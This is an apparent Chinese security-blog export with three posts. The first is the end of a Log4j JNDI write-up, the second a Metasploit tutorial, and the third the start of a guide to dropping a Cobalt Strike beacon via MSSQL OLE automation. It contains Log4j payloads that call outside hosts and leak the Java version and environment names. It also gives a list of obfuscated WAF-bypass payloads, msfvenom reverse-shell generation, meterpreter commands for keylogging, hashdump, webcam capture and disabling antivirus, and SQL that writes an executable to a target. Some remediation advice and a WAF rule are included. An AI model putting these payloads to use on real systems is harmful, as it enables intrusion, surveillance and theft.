<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line">public class log4j &#123;</span><br><span class="line">    private static final Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        logger.error(&quot;$&#123;jndi:ldap://08dc16c2.dns.1433.eu.org./exp&#125;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、直接运行步骤 2 的类，浏览器点击 Refresh Record，在浏览器看到回显</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396809077514.png" alt="图片"></p>
<p>4、外带数据的 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;sys:java.version&#125;.collaborator.com&#125;</span><br></pre></td></tr></table></figure>

<p>可以获取的数据如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396809946616.png" alt="图片"></p>
<h4 id="对于黑盒测试而言如何发现漏洞"><a href="#对于黑盒测试而言如何发现漏洞" class="headerlink" title="对于黑盒测试而言如何发现漏洞"></a>对于黑盒测试而言如何发现漏洞</h4><p>大家都知道存在漏洞是因为在打日志的时候存在问题，所以对于黑盒测试而言，只要是能够被服务端获取且被记录的地方都是可以触发漏洞的，比如 header 中的 Cookie、User-agent 等，post 或者 get 的参数中，url 中等，这种只能盲打，根据返回结果来判断。</p>
<p>检测漏洞项目参考：</p>
<blockquote>
<p><a href="https://github.com/takito1812/log4j-detect/blob/main/log4j-detect.py">https://github.com/takito1812/log4j-detect/blob/main/log4j-detect.py</a></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396810802318.png" alt="图片"></p>
<p>主要在 header 和 参数中增加 payload 进行漏洞触发，可以结合 dnslog 平台实现自动化漏洞发现，攻击图如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396811531120.jpeg" alt="图片"></p>
<h4 id="对于白盒来说如何发现存在漏洞的系统"><a href="#对于白盒来说如何发现存在漏洞的系统" class="headerlink" title="对于白盒来说如何发现存在漏洞的系统"></a>对于白盒来说如何发现存在漏洞的系统</h4><p>白盒相对容易一些，毕竟代码在手，还有什么不知道的，只需要搜索 git 平台的代码，如果符合漏洞版本范围内的都是存在问题的，全部升级替换即可。</p>
<p>下面是火线安全统计的关于存在漏洞组件的库，可以进行搜索，网站：</p>
<blockquote>
<p><a href="https://log4j2.huoxian.cn/layout">https://log4j2.huoxian.cn/layout</a></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396812192222.png" alt="图片"></p>
<p>就是企业越大，系统越多，更新的过程越复杂，需要测试调试的时间越多，尽量避免因为修复漏洞而导致系统故障。</p>
<h4 id="对于该漏洞的临时防护怎么做"><a href="#对于该漏洞的临时防护怎么做" class="headerlink" title="对于该漏洞的临时防护怎么做"></a>对于该漏洞的临时防护怎么做</h4><p>如果企业已经部署了 WAF 等安全产品，在漏洞爆发之初就应该及时更新规则，临时处置，从而给后续的根治争取时间，从 payload 上看，有几个关键特征:<code>$&#123;</code>,<code>jndi</code>,<code>ldap</code>,<code>rmi</code>等，但是如果只是拦截 <code>jndi</code> 等字符串，很可能没有很好的效果，因为可以进行字符串拼接从而绕过检测，而如果拦截 <code>$&#123;</code>，又可能造成正常功能无法使用，毕竟可能存在正常请求中包含这个关键词的情况。</p>
<p>所以在上临时规则时，要先灰度测试一段时间，才可以全量上规则，否则因为一时的防御，而导致新的问题。下面是一个关于 waf 绕过思路，也可以作为防御的参考：</p>
<p>1、jndi、ldap、rmi 绕过</p>
<ul>
<li>用 lowerCase upperCase 把关键词分割开</li>
<li>如果使用了正则的话可以使用 upper 把 jndı 转成 jndi</li>
</ul>
<p>案例：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396813088424.jpeg" alt="图片"></p>
<p>2、<code>$&#123;</code> 关键词拦截（范围大且容易产生误报，且不能真正解决，漏洞的触发点是在打印日志的时候把可控内容携带进去了）</p>
<p>3、为了减少误报，waf 匹配规则参考：</p>
<p>${(${(.<em>?:|.</em>?:.<em>?:-)(‘|”|<code>)*( ?1)&#125;*|[jndi:(ldap|rm)](&#39;|&quot;|</code>)</em>}*){9,10}</p>
<p>效果如图：<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396813777126.jpeg" alt="图片"></p>
<p>临时方案治标不治本，只能争取时间，从根源上测地消灭漏洞。</p>
<h4 id="在野利用的案例"><a href="#在野利用的案例" class="headerlink" title="在野利用的案例"></a>在野利用的案例</h4><p>随着漏洞的公开，在野利用该漏洞获取权限并进行挖矿勒索的案例已然出现，比如奇安信检测到的情况，详情<a href="https://mp.weixin.qq.com/s?__biz=Mzg4OTU4MjQ4Mg==&mid=2247485419&idx=1&sn=a8fccee9a7b0a364f9b7831bd41f4961&scene=21#wechat_redirect">《警惕！Log4j2漏洞已被多个僵尸网络家族利用》</a>，漏洞触发条件是在 url 中带入 payload：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396815286028.png" alt="图片"></p>
<p>漏洞利用成功后会加入 SSH 公钥，这个特征还比较明显，容易拦截。比如绿盟科技检测到的情况，详情<a href="https://mp.weixin.qq.com/s?__biz=Mzg2MDUxMjQxMg==&mid=2247486472&idx=1&sn=228de4ea7e0890292f49c73f09973d30&scene=21#wechat_redirect">《Log4j2修补时间差！挖矿软件和僵尸网络乘虚而入》</a>，payload 及利用如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396815922030.png" alt="图片"></p>
<h4 id="如何修复这个漏洞"><a href="#如何修复这个漏洞" class="headerlink" title="如何修复这个漏洞"></a>如何修复这个漏洞</h4><p>漏洞出现之后，官方也一直在推出补丁，然而一直也存在补丁绕过的情况 ，打官方补丁当然是一个比较靠谱的方式，但是一开始并不能完美解决。</p>
<p>在进行漏洞利用时，针对高版本的 java jdk 是无法直接利用的，但是也不一定完全不可以，对于一些企业，定期更新 java 的可能影响比较小，所以 java 版本更新也是一种缓解的方式。</p>
<p>其他层面的修复：</p>
<p>1、采用 rasp 对lookup的调用进行阻断</p>
<p>2、限制不必要的业务访问外网</p>
<p>3、设置 JVM 启动参数 - <code>Dlog4j2.formatMsgNoLookups=true</code></p>
<p>4、WAF 添加漏洞攻击代码临时拦截规则创建“log4j2.component.properties”文件，文件中增加配置“log4j2.formatMsgNoLookups&#x3D;true”</p>
<h4 id="拓展绕过waf-payload"><a href="#拓展绕过waf-payload" class="headerlink" title="拓展绕过waf payload"></a>拓展绕过waf payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125; </span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit&#125; </span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit&#125; </span><br><span class="line">$&#123;jndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit&#125; </span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit&#125; </span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit&#125;</span><br><span class="line">$&#123;$&#123;upper:jndi&#125;:$&#123;upper:rmi&#125;://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit&#125; </span><br><span class="line">$&#123;$&#123;upper:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;i:$&#123;upper:rmi&#125;://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit&#125;</span><br><span class="line">$&#123;$&#123;upper:j&#125;$&#123;upper:n&#125;$&#123;upper:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://$&#123;hostName&#125;.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk&#125;</span><br><span class="line">$&#123;$&#123;upper::-j&#125;$&#123;upper::-n&#125;$&#123;::-d&#125;$&#123;upper::-i&#125;:$&#123;upper::-l&#125;$&#123;upper::-d&#125;$&#123;upper::-a&#125;$&#123;upper::-p&#125;://$&#123;hostName&#125;.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://$&#123;hostName&#125;.$&#123;env:COMPUTERNAME&#125;.$&#123;env:USERDOMAIN&#125;.$&#123;env&#125;.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit 基本介绍</title>
    <url>/posts/f8ae10d9.html</url>
    <content><![CDATA[<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><h2 id="Metasploit模块划分"><a href="#Metasploit模块划分" class="headerlink" title="Metasploit模块划分"></a>Metasploit模块划分</h2><p>MSF是渗透测试领域最流行的渗透测试框架，它有以下几个模块：</p>
<blockquote>
<p>辅 助 模 块 (Auxiliary，扫描器)，扫描主机系统，寻找可用漏洞；</p>
<p>渗透攻击模块 (Exploits)，选择并配置一个漏洞利用模块；</p>
<p>攻击载荷模块 (Payloads)，选择并配置一个攻击载荷模块；</p>
<p>后渗透攻击模块 (Post)，用于内网渗透的各种操作；</p>
<p>编 码 器 模 块 (Encoders)，选择编码技术，绕过杀软（或其他免杀方式）；</p>
</blockquote>
<p>所有模块位置：<code>/usr/share/metasploit-framework/modules/</code></p>
<p><strong>渗透步骤（Exploit）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search xxx		<span class="comment">#搜索某个漏洞</span></span><br><span class="line">use xxx			<span class="comment">#使用某个漏洞利用模块</span></span><br><span class="line">show options	<span class="comment">#查看配置选项</span></span><br><span class="line"><span class="built_in">set</span> payload		<span class="comment">#配置攻击载荷</span></span><br><span class="line">exploit			<span class="comment">#执行渗透攻击</span></span><br></pre></td></tr></table></figure>

<h2 id="参数摘要"><a href="#参数摘要" class="headerlink" title="参数摘要"></a>参数摘要</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reload_all		<span class="comment">#从目录重载所有模块</span></span><br><span class="line">back	<span class="comment">#后退命令，移出当前上下文，用于模块切换</span></span><br><span class="line">info	<span class="comment">#目标和模块详细信息</span></span><br><span class="line">check	<span class="comment">#检查目标是否受某个漏洞影响</span></span><br><span class="line"></span><br><span class="line">sessions		<span class="comment">#会话管理</span></span><br><span class="line">sessions -l		<span class="comment">#列出所有会话</span></span><br><span class="line">sessions -K		<span class="comment">#终止所有会话</span></span><br><span class="line">sessions -i <span class="built_in">id</span>	<span class="comment">#进入某个会话</span></span><br><span class="line">sessions -v		<span class="comment">#以详细模式列出会话</span></span><br><span class="line">sessions -u		<span class="comment">#在许多平台上将shell升级到meterpreter会话</span></span><br><span class="line"></span><br><span class="line">show options	<span class="comment">#显示可选选项</span></span><br><span class="line">	 auxiliary	<span class="comment">#显示所有辅助模块</span></span><br><span class="line">	 exploits	<span class="comment">#显示所有漏洞利用模块</span></span><br><span class="line">	 payloads	<span class="comment">#显示所有有效载荷</span></span><br><span class="line">	 targets	<span class="comment">#显示所有可用目标</span></span><br><span class="line">	 advanced	<span class="comment">#显示更多高级选项</span></span><br><span class="line">	 encoders	<span class="comment">#显示可用编码器列表</span></span><br></pre></td></tr></table></figure>

<h1 id="使用辅助模块（Auxiliary）"><a href="#使用辅助模块（Auxiliary）" class="headerlink" title="使用辅助模块（Auxiliary）"></a>使用辅助模块（Auxiliary）</h1><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portmap/portmap_amp</span><br><span class="line">use auxiliary/scanner/portscan/ftpbounce</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">use auxiliary/scanner/portscan/ack</span><br><span class="line">use auxiliary/scanner/portscan/syn</span><br><span class="line">use auxiliary/scanner/portscan/xmas</span><br></pre></td></tr></table></figure>

<h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_login		<span class="comment">#SSH爆破</span></span><br><span class="line">auxiliary/scanner/vnc/vnc_none_auth	<span class="comment">#VNC空口令扫描</span></span><br><span class="line">auxiliary/scanner/telnet/telnet_login<span class="comment">#SSH爆破</span></span><br><span class="line">auxiliary/scanner/smb/smb_version	<span class="comment">#SMB系统版本扫描</span></span><br><span class="line">auxiliary/scanner/smb/smb_enumusers	<span class="comment">#SMB枚举</span></span><br><span class="line">auxiliary/scanner/smb/smb_login		<span class="comment">#SMB弱口令登录</span></span><br><span class="line">auxiliary/admin/smb/psexec_command	<span class="comment">#登录SMB且执行命令</span></span><br><span class="line"></span><br><span class="line">auxiliary/scanner/mssql/mssql_ping	<span class="comment">#MSSQL主机信息扫描</span></span><br><span class="line">auxiliary/admin/mssql/mssql_enum	<span class="comment">#MSSQL枚举</span></span><br><span class="line">auxiliary/scanner/mysql/mysql_login	<span class="comment">#MySQL弱口令扫描</span></span><br><span class="line">auxiliary/admin/mysql/mysql_enum	<span class="comment">#MySQL枚举</span></span><br></pre></td></tr></table></figure>

<h1 id="攻击载荷和编码（Payloads-amp-amp-Encoders）"><a href="#攻击载荷和编码（Payloads-amp-amp-Encoders）" class="headerlink" title="攻击载荷和编码（Payloads &amp;&amp; Encoders）"></a>攻击载荷和编码（Payloads &amp;&amp; Encoders）</h1><p><strong>MSF可以用以下方式，生成payload和编码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use windows/meterpreter_reverse_http</span><br><span class="line"></span><br><span class="line">-E   强制编码</span><br><span class="line">-e   要使用的编码器模块的名称</span><br><span class="line">-f   输出文件名（否则为stdout）</span><br><span class="line">-t   输出格式: raw,ruby,rb,perl,pl,c,java,dll,exe,elf,vbs,asp,war等</span><br><span class="line">-b   要避免的字符列表: <span class="string">&#x27;\x00\xff&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>但是我个人更喜欢用<code>msfvenom</code>生成<code>shellcode</code>然后编码免杀。</strong></p>
<p><strong>Windows</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=Kali监听端口 -f exe &gt; msf.exe</span><br><span class="line"></span><br><span class="line">参数选项：</span><br><span class="line">-p			指定的payload</span><br><span class="line">-e 			编码器，x86/shikata_ga_nai</span><br><span class="line">-i			迭代器，对有效载荷的编码次数</span><br><span class="line">-f			输出文件的格式,exe、dll、raw</span><br></pre></td></tr></table></figure>

<p><strong>Linux</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.1.1.15 LPORT=6666 -f elf &gt; msf.elf</span><br></pre></td></tr></table></figure>

<h1 id="监听反弹shell"><a href="#监听反弹shell" class="headerlink" title="监听反弹shell"></a>监听反弹shell</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 10.1.1.15</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 6666</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<h1 id="Meterpreter用例"><a href="#Meterpreter用例" class="headerlink" title="Meterpreter用例"></a>Meterpreter用例</h1><p>刚获得<code>Meterpreter Shell</code>时，该Shell是极其脆弱的，可以把它和目标机中一个稳定的程序绑定</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">getpid			<span class="comment">#查看当前Meterpreter Shell的进程号</span></span><br><span class="line">ps				<span class="comment">#获取目标机正运行的进程</span></span><br><span class="line">migrate 476		<span class="comment">#将shell迁移到PID为786的进程中</span></span><br></pre></td></tr></table></figure>

<h2 id="命令摘要"><a href="#命令摘要" class="headerlink" title="命令摘要"></a>命令摘要</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span>、<span class="built_in">ls</span>、<span class="built_in">cd</span></span><br><span class="line">getuid		<span class="comment">#查看当前权限</span></span><br><span class="line">getsystem	<span class="comment">#获得系统管理员权限（要本地管理员权限运行）</span></span><br><span class="line">hashdump	<span class="comment">#抓哈希密码</span></span><br><span class="line">sysinfo		<span class="comment">#查看系统信息</span></span><br><span class="line">idletim     <span class="comment">#查看目标系统已运行时间</span></span><br><span class="line">route		<span class="comment">#查看目标机完整网络设置</span></span><br><span class="line">shell		<span class="comment">#进入目标机shell，exit退出she</span></span><br><span class="line">background	<span class="comment">#将meterpreter隐藏在后台</span></span><br><span class="line"></span><br><span class="line">upload ./1.txt c:\\1.txt		<span class="comment">#上传文件</span></span><br><span class="line">download c:\1.txt ./			<span class="comment">#下载文件</span></span><br><span class="line">search -f *.txt -d c://			<span class="comment">#搜索文件</span></span><br><span class="line"></span><br><span class="line">keyscan_start	<span class="comment">#启动键盘记录</span></span><br><span class="line">keyscan_stop	<span class="comment">#停止键盘记录</span></span><br><span class="line">keyscan_dump	<span class="comment">#转储键盘记录的内容</span></span><br><span class="line">screenshot		<span class="comment">#抓取截屏</span></span><br><span class="line">webcam_list		<span class="comment">#摄像头列表</span></span><br><span class="line">webcam_snap		<span class="comment">#摄像头拍照</span></span><br><span class="line">webcam_stream	<span class="comment">#抓取视频</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Kali-Linux下登录远程桌面</span></span><br><span class="line">sudo rdesktop -f 目标IP</span><br><span class="line"></span><br><span class="line">route add IP 子网掩码    <span class="comment">#添加路由，先background</span></span><br></pre></td></tr></table></figure>

<h1 id="后渗透模块（Post）"><a href="#后渗透模块（Post）" class="headerlink" title="后渗透模块（Post）"></a>后渗透模块（Post）</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/checkvm		<span class="comment">#检查目标是否虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm</span><br><span class="line">run post/windows/manage/killav		<span class="comment">#关闭杀软</span></span><br><span class="line">run post/windows/manage/enable_rdp	<span class="comment">#开启目标远程桌面</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users	<span class="comment">#列举当前登陆用户，和最近登陆过的用户</span></span><br><span class="line">run post/windows/gather/enum_applications		<span class="comment">#列举应用程序</span></span><br><span class="line">run windows/gather/credentials/windows_autologin<span class="comment">#列举自动登陆的用户名和密码</span></span><br></pre></td></tr></table></figure>

<p>MSF官方后渗透模块参考：<a href="https://www.offensive-security.com/metasploit-unleashed/post-module-reference/">https://www.offensive-security.com/metasploit-unleashed/post-module-reference/</a></p>
<h1 id="网络穿透"><a href="#网络穿透" class="headerlink" title="网络穿透"></a>网络穿透</h1><p><strong>拿到反向shell之后，获取目标网络信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br></pre></td></tr></table></figure>

<p><strong>使用<code>autoroute</code>模块添加路由</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 10.0.0.0/255.0.0.0</span><br><span class="line">meterpreter &gt; run autoroute -p		<span class="comment">#列出添加了路由规则的存活session</span></span><br></pre></td></tr></table></figure>

<p>添加完成后返回上一层，这里一定要保证添加了路由规则的sessions的存活,如果sessions掉了对应的路由规则也就失效了</p>
<p>添加完成后使用ms17_010的扫描脚本进行目标内网的扫描</p>
<h1 id="MSF靶机"><a href="#MSF靶机" class="headerlink" title="MSF靶机"></a>MSF靶机</h1><p><strong>Metasploitable2：</strong></p>
<p>下载地址：<a href="https://sourceforge.net/projects/metasploitable/">https://sourceforge.net/projects/metasploitable/</a></p>
<p>官方教程：<a href="https://metasploit.help.rapid7.com/docs/metasploitable-2">https://metasploit.help.rapid7.com/docs/metasploitable-2</a></p>
<p><strong>Metasploitable3</strong>：</p>
<p>下载地址：<a href="https://github.com/rapid7/metasploitable3/">https://github.com/rapid7/metasploitable3/</a></p>
<p>视频教程演示：<a href="https://www.youtube.com/playlist?list=PLZOToVAK85MpnjpcVtNMwmCxMZRFaY6mT">https://www.youtube.com/playlist?list=PLZOToVAK85MpnjpcVtNMwmCxMZRFaY6mT</a></p>
]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>MSSQL不出网文件落地上线方式</title>
    <url>/posts/a83843a4.html</url>
    <content><![CDATA[<blockquote>
<p>编者荐语：原理是通过MSSQL写入PE，通过出网主机代理上线，需要结合不出网上线主机方案，推荐使用 goproxy 代理上线。</p>
<p>转载自：<a href="https://mp.weixin.qq.com/s/aZSNpn-hLwI2MzyS0XKa8w">https://mp.weixin.qq.com/s/aZSNpn-hLwI2MzyS0XKa8w</a></p>
</blockquote>
<p><strong>0x01 前言</strong></p>
<p>一个MSSQL非注入的场景：在内网扫描到一个MSSQL弱口令，支持xp_cmdshell，Administrator权限，但不能出网，DNS也出不了，那么我们该如何将文件落地到目标主机并执行上线呢？</p>
<p><strong>0x02 利用思路</strong></p>
<p>我们可以通过当前这台能出网的主机开启一个Socks代理连接不出网主机的MSSQL，然后再利用以下方式将PE文件落地到不出网的MSSQL主机，最终通过出网主机来中转上线不出网主机。</p>
<p><strong>0x03 启用OLE组件</strong></p>
<p>在执行命令或写入文件时都需要用到sp_oacreate，这主要是用来创建OLE对象，所以需要先执行以下SQL语句来启用“OLE Automation Procedures”组件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec master.dbo.sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br><span class="line">exec master.dbo.sp_configure &#x27;Ole Automation Procedures&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640.png" alt="图片"></p>
<p><strong>0x04 EXE转换HEX</strong></p>
<p>使用以下方式将生成的CS&#x2F;MSF攻击载荷文件转换为HEX编码，这里我找了几个可以转换HEX编码的方法，Linux的xxd命令，python脚本，或者010editor编辑器，根据个人习惯选择吧。</p>
<p><strong>(1) Linux exe -&gt; hex</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxd -ps beacon.exe hex.txt</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952771817.png" alt="图片"></p>
<p><strong>(2) python exe -&gt; hex</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">filename = &#x27;beacon.exe&#x27;</span><br><span class="line">with open(filename, &#x27;rb&#x27;) as f:</span><br><span class="line">    content = f.read()</span><br><span class="line">print(binascii.hexlify(content))</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952771918.png" alt="图片"></p>
<p><strong>(3) 010editor exe -&gt; hex</strong></p>
<p>利用这种方式拷贝下来的HEX也能使用certutil.exe -decodehex正常解码，但如果要用OLE组件写入时就还需要做下处理，将空格、换行都删掉，全部放在一行即可。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952771919.png" alt="图片"></p>
<p><strong>0x05 EXE文件落地</strong></p>
<p>将我们上边转换好的HEX编码放在第一行，加上0x，然后在本地的Navicat Premium数据库管理工具中执行即可，这时可以看到cs.exe文件已经成功落地到目标主机的磁盘。</p>
<p><strong>注：</strong>xp_cmdshell组件调用的是cmd.exe，所以在利用这种方式写入大文件时可能会出现字符长度限制等问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECLARE @DATA VARBINARY(MAX) = 0x-hex</span><br><span class="line">        DECLARE @filepath VARCHAR(MAX) = &#x27;C:\\Windows\\temp\\cs.exe&#x27;</span><br><span class="line">        DECLARE @ObjectToken INT</span><br><span class="line">        EXEC sp_OACreate &#x27;ADODB.Stream&#x27;, @ObjectToken OUTPUT</span><br><span class="line">        EXEC sp_OASetProperty @ObjectToken, &#x27;Type&#x27;, 1</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;Open&#x27;</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;Write&#x27;, NULL, @DATA</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;SaveToFile&#x27;, NULL, @filepath, 2</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;Close&#x27;</span><br><span class="line">        EXEC sp_OADestroy @ObjectToken</span><br><span class="line">        SELECT @filepath</span><br></pre></td></tr></table></figure>

